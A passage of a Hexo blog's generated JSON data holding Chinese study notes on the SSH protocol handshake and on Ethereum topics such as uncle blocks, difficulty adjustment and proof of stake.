title=\"（1）SSH工作的特点\"></a>（1）SSH工作的特点</h2><ul>\n<li>工作在应用层。</li>\n<li>使用TCP传输协议。</li>\n<li>密文传输命令，比telent明文传输命令更加安全。</li>\n<li>只能对与一个应用进行加密。</li>\n<li>需要双方都有公私钥对。</li>\n<li>端口22。</li>\n</ul>\n<h2 id=\"（2）SSH工作的基本框架\"><a href=\"#（2）SSH工作的基本框架\" class=\"headerlink\" title=\"（2）SSH工作的基本框架\"></a>（2）SSH工作的基本框架</h2><h3 id=\"a-传输层协议\"><a href=\"#a-传输层协议\" class=\"headerlink\" title=\"a. 传输层协议\"></a>a. 传输层协议</h3><p>提供服务器认证，数据机密性，信息完整性 等的支持。</p>\n<h3 id=\"b-用户认证协议\"><a href=\"#b-用户认证协议\" class=\"headerlink\" title=\"b. 用户认证协议\"></a>b. 用户认证协议</h3><p>为服务器提供客户端的身份鉴别。</p>\n<h3 id=\"c-连接协议\"><a href=\"#c-连接协议\" class=\"headerlink\" title=\"c. 连接协议\"></a>c. 连接协议</h3><p>将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。</p>\n<h2 id=\"（3）SSH建立与通信的简单流程\"><a href=\"#（3）SSH建立与通信的简单流程\" class=\"headerlink\" title=\"（3）SSH建立与通信的简单流程\"></a>（3）SSH建立与通信的简单流程</h2><h3 id=\"a-版本号协商阶段\"><a href=\"#a-版本号协商阶段\" class=\"headerlink\" title=\"a. 版本号协商阶段\"></a>a. 版本号协商阶段</h3><ul>\n<li>服务器打开端口 22，等待客户端连接。</li>\n<li>客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。</li>\n<li>客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。</li>\n<li>客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。</li>\n<li>如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。</li>\n<li>版本号协商阶段报文都是采用明文方式传输的。</li>\n</ul>\n<h3 id=\"b-密钥和算法协商阶段\"><a href=\"#b-密钥和算法协商阶段\" class=\"headerlink\" title=\"b.密钥和算法协商阶段\"></a>b.密钥和算法协商阶段</h3><ul>\n<li>服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;</li>\n<li>服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。</li>\n<li>服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。</li>\n<li>对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全</li>\n<li>在认证阶段，两端会使用会话 ID用于认证过程。</li>\n<li> 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。</li>\n</ul>\n<h3 id=\"c-认证阶段\"><a href=\"#c-认证阶段\" class=\"headerlink\" title=\"c.认证阶段\"></a>c.认证阶段</h3><ul>\n<li>客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。</li>\n<li>服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。</li>\n<li>客户端从认证方法列表中选取一种认证方法再次进行认证。</li>\n<li>该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</li>\n</ul>\n<h4 id=\"SSH1认证的方式\"><a href=\"#SSH1认证的方式\" class=\"headerlink\" title=\"SSH1认证的方式\"></a>SSH1认证的方式</h4><ul>\n<li> password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。</li>\n<li>publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息。</li>\n</ul>\n<h4 id=\"SSH2额外的认证方式\"><a href=\"#SSH2额外的认证方式\" class=\"headerlink\" title=\"SSH2额外的认证方式\"></a>SSH2额外的认证方式</h4><ul>\n<li>password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。</li>\n<li>any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</li>\n</ul>\n<h3 id=\"d-会话请求阶段\"><a href=\"#d-会话请求阶段\" class=\"headerlink\" title=\"d.会话请求阶段\"></a>d.会话请求阶段</h3><ul>\n<li>服务器等待客户端的请求；</li>\n<li>认证通过后，客户端向服务器发送会话请求；</li>\n<li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li>\n</ul>\n<h3 id=\"e-交互会话阶段\"><a href=\"#e-交互会话阶段\" class=\"headerlink\" title=\"e.交互会话阶段\"></a>e.交互会话阶段</h3><ul>\n<li>在这个模式下，数据被双向传送。</li>\n<li>客户端将要执行的命令加密后传给服务器;</li>\n<li>服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;</li>\n<li>客户端将接收到的结果解密后显示到终端上。</li>\n</ul>\n<h1 id=\"2-SSH实际流程数据包分析\"><a href=\"#2-SSH实际流程数据包分析\" class=\"headerlink\" title=\"2. SSH实际流程数据包分析\"></a>2. <a href=\"https://blog.csdn.net/m0_49864110/article/details/128500490\">SSH实际流程数据包分析</a></h1><h2 id=\"（1）版本协商\"><a href=\"#（1）版本协商\" class=\"headerlink\" title=\"（1）版本协商\"></a>（1）版本协商</h2><h3 id=\"客户端发送到服务端的协商\"><a href=\"#客户端发送到服务端的协商\" class=\"headerlink\" title=\"客户端发送到服务端的协商\"></a>客户端发送到服务端的协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722150717.png\"></p>\n<h3 id=\"服务端返回给客户端的协商\"><a href=\"#服务端返回给客户端的协商\" class=\"headerlink\" title=\"服务端返回给客户端的协商\"></a>服务端返回给客户端的协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722150736.png\"></p>\n<h2 id=\"（2）算法协商\"><a href=\"#（2）算法协商\" class=\"headerlink\" title=\"（2）算法协商\"></a>（2）算法协商</h2><h3 id=\"客户端到服务端的算法协商\"><a href=\"#客户端到服务端的算法协商\" class=\"headerlink\" title=\"客户端到服务端的算法协商\"></a>客户端到服务端的算法协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722151051.png\"></p>\n<h3 id=\"服务端到客户端的算法协商\"><a href=\"#服务端到客户端的算法协商\" class=\"headerlink\" title=\"服务端到客户端的算法协商\"></a>服务端到客户端的算法协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722151212.png\"></p>\n<h2 id=\"（3）密钥交换\"><a href=\"#（3）密钥交换\" class=\"headerlink\" title=\"（3）密钥交换\"></a>（3）密钥交换</h2><h3 id=\"客户端到服务端密钥交换\"><a href=\"#客户端到服务端密钥交换\" class=\"headerlink\" title=\"客户端到服务端密钥交换\"></a>客户端到服务端密钥交换</h3><p><img src=\"/../pic/Pasted%20image%2020240722151314.png\"></p>\n<h3 id=\"服务端到客户端密钥交换-newkeys\"><a href=\"#服务端到客户端密钥交换-newkeys\" class=\"headerlink\" title=\"服务端到客户端密钥交换+newkeys\"></a>服务端到客户端密钥交换+newkeys</h3><p><img src=\"/../pic/Pasted%20image%2020240722151617.png\"></p>\n<h3 id=\"客户端到服务端的newkeys\"><a href=\"#客户端到服务端的newkeys\" class=\"headerlink\" title=\"客户端到服务端的newkeys\"></a>客户端到服务端的newkeys</h3><p><img src=\"/../pic/Pasted%20image%2020240722151748.png\"></p>\n"},{"title":"05-ETH-公式机制","date":"2024-07-30T15:56:48.000Z","_content":"  \n# 共识机制（ghost）\n\n  \n\n- 作废块也有出块奖励，uncle block。\n\n- 叔块奖励奖励的7/8。\n\n- 最多包含2个叔父区块。\n\n- 包含了区块获得1/32。\n\n  \n![](../pic/Pasted%20image%2020240730154320.png)\n  \n  \n  \n\n# 修改协议\n\n  \n\n- 区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。\n\n- 最多有7辈分的叔。\n\n- 为了尽快合并区块链。\n\n- 解决临时性分叉。\n\n- 防止篡改。\n\n- 只能合并合法区块，包含了非法块就成为坏块。\n\n  \n![](../pic/Pasted%20image%2020240730155608.png)\n\n  \n  \n\n# 奖励\n\n  \n\n- block reward：不会自动变化。\n\n- gas free：\n\n- 叔父区块无法包含交易。\n\n- 叔父区块只查header，交易容易与主链冲突。\n\n- 叔块包含的交易会在后面的主链上进行执行。\n\n- 只有分叉后的第一个区块才奖励。\n![](../pic/Pasted%20image%2020240730161831.png)","source":"_posts/05-ETH-公式机制.md","raw":"---\ntitle: 05-ETH-公式机制\ndate: 2024-07-30 23:56:48\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n  \n# 共识机制（ghost）\n\n  \n\n- 作废块也有出块奖励，uncle block。\n\n- 叔块奖励奖励的7/8。\n\n- 最多包含2个叔父区块。\n\n- 包含了区块获得1/32。\n\n  \n![](../pic/Pasted%20image%2020240730154320.png)\n  \n  \n  \n\n# 修改协议\n\n  \n\n- 区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。\n\n- 最多有7辈分的叔。\n\n- 为了尽快合并区块链。\n\n- 解决临时性分叉。\n\n- 防止篡改。\n\n- 只能合并合法区块，包含了非法块就成为坏块。\n\n  \n![](../pic/Pasted%20image%2020240730155608.png)\n\n  \n  \n\n# 奖励\n\n  \n\n- block reward：不会自动变化。\n\n- gas free：\n\n- 叔父区块无法包含交易。\n\n- 叔父区块只查header，交易容易与主链冲突。\n\n- 叔块包含的交易会在后面的主链上进行执行。\n\n- 只有分叉后的第一个区块才奖励。\n![](../pic/Pasted%20image%2020240730161831.png)","slug":"05-ETH-公式机制","published":1,"updated":"2024-07-30T16:00:03.053Z","comments":1,"layout":"post","photos":[],"_id":"clz8lvt0h0000isundtyc1zql","content":"<h1 id=\"共识机制（ghost）\"><a href=\"#共识机制（ghost）\" class=\"headerlink\" title=\"共识机制（ghost）\"></a>共识机制（ghost）</h1><ul>\n<li><p>作废块也有出块奖励，uncle block。</p>\n</li>\n<li><p>叔块奖励奖励的7&#x2F;8。</p>\n</li>\n<li><p>最多包含2个叔父区块。</p>\n</li>\n<li><p>包含了区块获得1&#x2F;32。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730154320.png\"></p>\n<h1 id=\"修改协议\"><a href=\"#修改协议\" class=\"headerlink\" title=\"修改协议\"></a>修改协议</h1><ul>\n<li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p>\n</li>\n<li><p>最多有7辈分的叔。</p>\n</li>\n<li><p>为了尽快合并区块链。</p>\n</li>\n<li><p>解决临时性分叉。</p>\n</li>\n<li><p>防止篡改。</p>\n</li>\n<li><p>只能合并合法区块，包含了非法块就成为坏块。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730155608.png\"></p>\n<h1 id=\"奖励\"><a href=\"#奖励\" class=\"headerlink\" title=\"奖励\"></a>奖励</h1><ul>\n<li><p>block reward：不会自动变化。</p>\n</li>\n<li><p>gas free：</p>\n</li>\n<li><p>叔父区块无法包含交易。</p>\n</li>\n<li><p>叔父区块只查header，交易容易与主链冲突。</p>\n</li>\n<li><p>叔块包含的交易会在后面的主链上进行执行。</p>\n</li>\n<li><p>只有分叉后的第一个区块才奖励。<br><img src=\"/../pic/Pasted%20image%2020240730161831.png\"></p>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"共识机制（ghost）\"><a href=\"#共识机制（ghost）\" class=\"headerlink\" title=\"共识机制（ghost）\"></a>共识机制（ghost）</h1><ul>\n<li><p>作废块也有出块奖励，uncle block。</p>\n</li>\n<li><p>叔块奖励奖励的7&#x2F;8。</p>\n</li>\n<li><p>最多包含2个叔父区块。</p>\n</li>\n<li><p>包含了区块获得1&#x2F;32。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730154320.png\"></p>\n<h1 id=\"修改协议\"><a href=\"#修改协议\" class=\"headerlink\" title=\"修改协议\"></a>修改协议</h1><ul>\n<li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p>\n</li>\n<li><p>最多有7辈分的叔。</p>\n</li>\n<li><p>为了尽快合并区块链。</p>\n</li>\n<li><p>解决临时性分叉。</p>\n</li>\n<li><p>防止篡改。</p>\n</li>\n<li><p>只能合并合法区块，包含了非法块就成为坏块。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730155608.png\"></p>\n<h1 id=\"奖励\"><a href=\"#奖励\" class=\"headerlink\" title=\"奖励\"></a>奖励</h1><ul>\n<li><p>block reward：不会自动变化。</p>\n</li>\n<li><p>gas free：</p>\n</li>\n<li><p>叔父区块无法包含交易。</p>\n</li>\n<li><p>叔父区块只查header，交易容易与主链冲突。</p>\n</li>\n<li><p>叔块包含的交易会在后面的主链上进行执行。</p>\n</li>\n<li><p>只有分叉后的第一个区块才奖励。<br><img src=\"/../pic/Pasted%20image%2020240730161831.png\"></p>\n</li>\n</ul>\n"},{"title":"06-ETH-挖矿算法","date":"2024-07-30T15:56:54.000Z","_content":"  \n# 共识机制（ghost）\n  \n\n- 作废块也有出块奖励，uncle block。\n\n- 叔块奖励奖励的7/8。\n\n- 最多包含2个叔父区块。\n\n- 包含了区块获得1/32。\n\n  \n![](../pic/Pasted%20image%2020240730154320.png)\n  \n  \n  \n\n# 修改协议\n\n  \n\n- 区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。\n\n- 最多有7辈分的叔。\n\n- 为了尽快合并区块链。\n\n- 解决临时性分叉。\n\n- 防止篡改。\n\n- 只能合并合法区块，包含了非法块就成为坏块。\n\n  \n![](../pic/Pasted%20image%2020240730155608.png)\n\n  \n  \n\n# 奖励\n\n  \n\n- block reward：不会自动变化。\n\n- gas free：\n\n- 叔父区块无法包含交易。\n\n- 叔父区块只查header，交易容易与主链冲突。\n\n- 叔块包含的交易会在后面的主链上进行执行。\n\n- 只有分叉后的第一个区块才奖励。\n![](../pic/Pasted%20image%2020240730161831.png)","source":"_posts/06-ETH-挖矿算法.md","raw":"---\ntitle: 06-ETH-挖矿算法\ndate: 2024-07-30 23:56:54\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n  \n# 共识机制（ghost）\n  \n\n- 作废块也有出块奖励，uncle block。\n\n- 叔块奖励奖励的7/8。\n\n- 最多包含2个叔父区块。\n\n- 包含了区块获得1/32。\n\n  \n![](../pic/Pasted%20image%2020240730154320.png)\n  \n  \n  \n\n# 修改协议\n\n  \n\n- 区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。\n\n- 最多有7辈分的叔。\n\n- 为了尽快合并区块链。\n\n- 解决临时性分叉。\n\n- 防止篡改。\n\n- 只能合并合法区块，包含了非法块就成为坏块。\n\n  \n![](../pic/Pasted%20image%2020240730155608.png)\n\n  \n  \n\n# 奖励\n\n  \n\n- block reward：不会自动变化。\n\n- gas free：\n\n- 叔父区块无法包含交易。\n\n- 叔父区块只查header，交易容易与主链冲突。\n\n- 叔块包含的交易会在后面的主链上进行执行。\n\n- 只有分叉后的第一个区块才奖励。\n![](../pic/Pasted%20image%2020240730161831.png)","slug":"06-ETH-挖矿算法","published":1,"updated":"2024-07-30T16:01:01.918Z","comments":1,"layout":"post","photos":[],"_id":"clz8lvt0r0002isun9gvmetmt","content":"<h1 id=\"共识机制（ghost）\"><a href=\"#共识机制（ghost）\" class=\"headerlink\" title=\"共识机制（ghost）\"></a>共识机制（ghost）</h1><ul>\n<li><p>作废块也有出块奖励，uncle block。</p>\n</li>\n<li><p>叔块奖励奖励的7&#x2F;8。</p>\n</li>\n<li><p>最多包含2个叔父区块。</p>\n</li>\n<li><p>包含了区块获得1&#x2F;32。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730154320.png\"></p>\n<h1 id=\"修改协议\"><a href=\"#修改协议\" class=\"headerlink\" title=\"修改协议\"></a>修改协议</h1><ul>\n<li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p>\n</li>\n<li><p>最多有7辈分的叔。</p>\n</li>\n<li><p>为了尽快合并区块链。</p>\n</li>\n<li><p>解决临时性分叉。</p>\n</li>\n<li><p>防止篡改。</p>\n</li>\n<li><p>只能合并合法区块，包含了非法块就成为坏块。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730155608.png\"></p>\n<h1 id=\"奖励\"><a href=\"#奖励\" class=\"headerlink\" title=\"奖励\"></a>奖励</h1><ul>\n<li><p>block reward：不会自动变化。</p>\n</li>\n<li><p>gas free：</p>\n</li>\n<li><p>叔父区块无法包含交易。</p>\n</li>\n<li><p>叔父区块只查header，交易容易与主链冲突。</p>\n</li>\n<li><p>叔块包含的交易会在后面的主链上进行执行。</p>\n</li>\n<li><p>只有分叉后的第一个区块才奖励。<br><img src=\"/../pic/Pasted%20image%2020240730161831.png\"></p>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"共识机制（ghost）\"><a href=\"#共识机制（ghost）\" class=\"headerlink\" title=\"共识机制（ghost）\"></a>共识机制（ghost）</h1><ul>\n<li><p>作废块也有出块奖励，uncle block。</p>\n</li>\n<li><p>叔块奖励奖励的7&#x2F;8。</p>\n</li>\n<li><p>最多包含2个叔父区块。</p>\n</li>\n<li><p>包含了区块获得1&#x2F;32。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730154320.png\"></p>\n<h1 id=\"修改协议\"><a href=\"#修改协议\" class=\"headerlink\" title=\"修改协议\"></a>修改协议</h1><ul>\n<li><p>区块部分辈分，只要是之前的未在最长链的区块，都算叔父区块。</p>\n</li>\n<li><p>最多有7辈分的叔。</p>\n</li>\n<li><p>为了尽快合并区块链。</p>\n</li>\n<li><p>解决临时性分叉。</p>\n</li>\n<li><p>防止篡改。</p>\n</li>\n<li><p>只能合并合法区块，包含了非法块就成为坏块。</p>\n</li>\n</ul>\n<p><img src=\"/../pic/Pasted%20image%2020240730155608.png\"></p>\n<h1 id=\"奖励\"><a href=\"#奖励\" class=\"headerlink\" title=\"奖励\"></a>奖励</h1><ul>\n<li><p>block reward：不会自动变化。</p>\n</li>\n<li><p>gas free：</p>\n</li>\n<li><p>叔父区块无法包含交易。</p>\n</li>\n<li><p>叔父区块只查header，交易容易与主链冲突。</p>\n</li>\n<li><p>叔块包含的交易会在后面的主链上进行执行。</p>\n</li>\n<li><p>只有分叉后的第一个区块才奖励。<br><img src=\"/../pic/Pasted%20image%2020240730161831.png\"></p>\n</li>\n</ul>\n"},{"title":"07-ETH-难度调整","date":"2024-07-30T15:57:03.000Z","_content":"# 理论\n![](../pic/Pasted%20image%2020240730170810.png)\n\n\n![](../pic/Pasted%20image%2020240730170925.png)\n\n![](../pic/Pasted%20image%2020240730171104.png)\n\n![](../pic/Pasted%20image%2020240730171145.png)\n\n\n- 为了实现15秒左右的共识，为权益证明实现提供更多的时间。\n- 回退了300万个\n![](../pic/Pasted%20image%2020240730171630.png)\n\n\n- 难度炸弹的调整在拜占庭阶段。\n- 调整区块的奖励。\n\n\n\n# 具体的代码实现\n\n## 拜占庭阶段挖矿难度调整 \n![](../pic/Pasted%20image%2020240730171915.png)\n\n![](../pic/Pasted%20image%2020240730172050.png)\n\n![](../pic/Pasted%20image%2020240730172201.png)\n\n\n","source":"_posts/07-ETH-难度调整.md","raw":"---\ntitle: 07-ETH-难度调整\ndate: 2024-07-30 23:57:03\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n# 理论\n![](../pic/Pasted%20image%2020240730170810.png)\n\n\n![](../pic/Pasted%20image%2020240730170925.png)\n\n![](../pic/Pasted%20image%2020240730171104.png)\n\n![](../pic/Pasted%20image%2020240730171145.png)\n\n\n- 为了实现15秒左右的共识，为权益证明实现提供更多的时间。\n- 回退了300万个\n![](../pic/Pasted%20image%2020240730171630.png)\n\n\n- 难度炸弹的调整在拜占庭阶段。\n- 调整区块的奖励。\n\n\n\n# 具体的代码实现\n\n## 拜占庭阶段挖矿难度调整 \n![](../pic/Pasted%20image%2020240730171915.png)\n\n![](../pic/Pasted%20image%2020240730172050.png)\n\n![](../pic/Pasted%20image%2020240730172201.png)\n\n\n","slug":"07-ETH-难度调整","published":1,"updated":"2024-07-30T16:01:39.706Z","comments":1,"layout":"post","photos":[],"_id":"clz8lvt0s0004isunebc50jvr","content":"<h1 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h1><p><img src=\"/../pic/Pasted%20image%2020240730170810.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730170925.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730171104.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730171145.png\"></p>\n<ul>\n<li><p>为了实现15秒左右的共识，为权益证明实现提供更多的时间。</p>\n</li>\n<li><p>回退了300万个<br><img src=\"/../pic/Pasted%20image%2020240730171630.png\"></p>\n</li>\n<li><p>难度炸弹的调整在拜占庭阶段。</p>\n</li>\n<li><p>调整区块的奖励。</p>\n</li>\n</ul>\n<h1 id=\"具体的代码实现\"><a href=\"#具体的代码实现\" class=\"headerlink\" title=\"具体的代码实现\"></a>具体的代码实现</h1><h2 id=\"拜占庭阶段挖矿难度调整\"><a href=\"#拜占庭阶段挖矿难度调整\" class=\"headerlink\" title=\"拜占庭阶段挖矿难度调整\"></a>拜占庭阶段挖矿难度调整</h2><p><img src=\"/../pic/Pasted%20image%2020240730171915.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730172050.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730172201.png\"></p>\n","excerpt":"","more":"<h1 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h1><p><img src=\"/../pic/Pasted%20image%2020240730170810.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730170925.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730171104.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730171145.png\"></p>\n<ul>\n<li><p>为了实现15秒左右的共识，为权益证明实现提供更多的时间。</p>\n</li>\n<li><p>回退了300万个<br><img src=\"/../pic/Pasted%20image%2020240730171630.png\"></p>\n</li>\n<li><p>难度炸弹的调整在拜占庭阶段。</p>\n</li>\n<li><p>调整区块的奖励。</p>\n</li>\n</ul>\n<h1 id=\"具体的代码实现\"><a href=\"#具体的代码实现\" class=\"headerlink\" title=\"具体的代码实现\"></a>具体的代码实现</h1><h2 id=\"拜占庭阶段挖矿难度调整\"><a href=\"#拜占庭阶段挖矿难度调整\" class=\"headerlink\" title=\"拜占庭阶段挖矿难度调整\"></a>拜占庭阶段挖矿难度调整</h2><p><img src=\"/../pic/Pasted%20image%2020240730171915.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730172050.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240730172201.png\"></p>\n"},{"title":"08-ETH-权益证明","date":"2024-07-31T15:51:38.000Z","_content":"## 工作量证明能耗太高\n### ETH每笔能耗小于BTC\n\n- 由于ETH出块速度快。\n- 平均下来消耗能耗就会小一点。\n\n# 原来是工作量证明\n\n# POS(权益证明)\n\n- 需要51%的币才有攻击的可能。\n\n\n# Proof of Deposit\n##  说明\n\n - 可以通过币来进行降低挖矿难度。\n - 威胁是币越多的人越容易挖矿。\n - 通过对于投入降低难度的币进行时间锁定。\n\n## 遇到的问题\n\n- 两头下注，在两条链上投入相同的币进行挖矿。\n\n\n## Casper the Friendly  Finality Gadest(FFG)\n\n### 特点\n\n- 不会出现回滚，确认最长连。\n### 验证者（Validator）\n\n- 投入一定数量的以太币作为质押。\n- 权重与投入的币数量正比。\n- 币会被锁定。\n- 不投票会被罚一定数量的以太币。\n- 乱投不符合规则的票，会被没收投入的以太币，并销毁。\n- 有任期。\n- 任期结束后进行等待期，进行等待其他的检举揭发，进行惩处。\n- \n### 投票\n\n- 50个区块投票一次.\n- 每个epoch投一次票。\n- 这一次投票对于上一个epoch来说是准备的投票。\n- 对于这一个epoch来说是提交的投票。\n- 获取两个投票2/3以上的投票资金支持才可以。\n\n### 问题\n\n#### 投票的Finality会不会被推翻\n\n- 至少有1/3的验证者进行两边押注。\n#### 为什么不开始就用权益证明\n\n- bug bounty\n\n## EOS(DPOS)\n\n- 选取超级节点进行投票。\n\n## 挖矿的实际作用\n\n- 可以以货币形式存储过剩的电能。\n- 但是进行的是无用功操作，浪费资源。","source":"_posts/08-ETH-权益证明.md","raw":"---\ntitle: 08-ETH-权益证明\ndate: 2024-07-31 23:51:38\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n## 工作量证明能耗太高\n### ETH每笔能耗小于BTC\n\n- 由于ETH出块速度快。\n- 平均下来消耗能耗就会小一点。\n\n# 原来是工作量证明\n\n# POS(权益证明)\n\n- 需要51%的币才有攻击的可能。\n\n\n# Proof of Deposit\n##  说明\n\n - 可以通过币来进行降低挖矿难度。\n - 威胁是币越多的人越容易挖矿。\n - 通过对于投入降低难度的币进行时间锁定。\n\n## 遇到的问题\n\n- 两头下注，在两条链上投入相同的币进行挖矿。\n\n\n## Casper the Friendly  Finality Gadest(FFG)\n\n### 特点\n\n- 不会出现回滚，确认最长连。\n### 验证者（Validator）\n\n- 投入一定数量的以太币作为质押。\n- 权重与投入的币数量正比。\n- 币会被锁定。\n- 不投票会被罚一定数量的以太币。\n- 乱投不符合规则的票，会被没收投入的以太币，并销毁。\n- 有任期。\n- 任期结束后进行等待期，进行等待其他的检举揭发，进行惩处。\n- \n### 投票\n\n- 50个区块投票一次.\n- 每个epoch投一次票。\n- 这一次投票对于上一个epoch来说是准备的投票。\n- 对于这一个epoch来说是提交的投票。\n- 获取两个投票2/3以上的投票资金支持才可以。\n\n### 问题\n\n#### 投票的Finality会不会被推翻\n\n- 至少有1/3的验证者进行两边押注。\n#### 为什么不开始就用权益证明\n\n- bug bounty\n\n## EOS(DPOS)\n\n- 选取超级节点进行投票。\n\n## 挖矿的实际作用\n\n- 可以以货币形式存储过剩的电能。\n- 但是进行的是无用功操作，浪费资源。","slug":"08-ETH-权益证明","published":1,"updated":"2024-07-31T15:53:57.781Z","comments":1,"layout":"post","photos":[],"_id":"clza14odc000084ungszc1wff","content":"<h2 id=\"工作量证明能耗太高\"><a href=\"#工作量证明能耗太高\" class=\"headerlink\" title=\"工作量证明能耗太高\"></a>工作量证明能耗太高</h2><h3 id=\"ETH每笔能耗小于BTC\"><a href=\"#ETH每笔能耗小于BTC\" class=\"headerlink\" title=\"ETH每笔能耗小于BTC\"></a>ETH每笔能耗小于BTC</h3><ul>\n<li>由于ETH出块速度快。</li>\n<li>平均下来消耗能耗就会小一点。</li>\n</ul>\n<h1 id=\"原来是工作量证明\"><a href=\"#原来是工作量证明\" class=\"headerlink\" title=\"原来是工作量证明\"></a>原来是工作量证明</h1><h1 id=\"POS-权益证明\"><a href=\"#POS-权益证明\" class=\"headerlink\" title=\"POS(权益证明)\"></a>POS(权益证明)</h1><ul>\n<li>需要51%的币才有攻击的可能。</li>\n</ul>\n<h1 id=\"Proof-of-Deposit\"><a href=\"#Proof-of-Deposit\" class=\"headerlink\" title=\"Proof of Deposit\"></a>Proof of Deposit</h1><h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><ul>\n<li>可以通过币来进行降低挖矿难度。</li>\n<li>威胁是币越多的人越容易挖矿。</li>\n<li>通过对于投入降低难度的币进行时间锁定。</li>\n</ul>\n<h2 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h2><ul>\n<li>两头下注，在两条链上投入相同的币进行挖矿。</li>\n</ul>\n<h2 id=\"Casper-the-Friendly-Finality-Gadest-FFG\"><a href=\"#Casper-the-Friendly-Finality-Gadest-FFG\" class=\"headerlink\" title=\"Casper the Friendly  Finality Gadest(FFG)\"></a>Casper the Friendly  Finality Gadest(FFG)</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>不会出现回滚，确认最长连。</li>\n</ul>\n<h3 id=\"验证者（Validator）\"><a href=\"#验证者（Validator）\" class=\"headerlink\" title=\"验证者（Validator）\"></a>验证者（Validator）</h3><ul>\n<li>投入一定数量的以太币作为质押。</li>\n<li>权重与投入的币数量正比。</li>\n<li>币会被锁定。</li>\n<li>不投票会被罚一定数量的以太币。</li>\n<li>乱投不符合规则的票，会被没收投入的以太币，并销毁。</li>\n<li>有任期。</li>\n<li>任期结束后进行等待期，进行等待其他的检举揭发，进行惩处。</li>\n<li></li>\n</ul>\n<h3 id=\"投票\"><a href=\"#投票\" class=\"headerlink\" 